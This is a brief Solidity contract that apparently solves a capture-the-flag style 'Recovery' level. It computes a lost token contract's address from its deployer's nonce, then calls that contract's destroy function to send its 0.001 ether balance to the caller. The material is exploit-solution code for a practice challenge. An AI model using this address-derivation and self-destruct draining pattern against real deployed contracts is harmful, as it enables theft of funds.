// SPDX-License-Identifier: Unlicense
pragma solidity =0.8.23;

import {SimpleToken} from "./Recovery.sol";

contract HelperRecovery {
    function takeOutValue(address _deployer) external {
        address lostTokenAddr = getAddress(_deployer);
        SimpleToken token = SimpleToken(payable(lostTokenAddr));
        token.destroy(payable(msg.sender));
        if (lostTokenAddr.balance != 0) revert();
    }

    function getAddress(address _deployer) private view returns (address lostTokenAddr) {
        lostTokenAddr =
            address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), _deployer, bytes1(0x01))))));
        if (lostTokenAddr.balance != 0.001 ether) revert();
    }
}
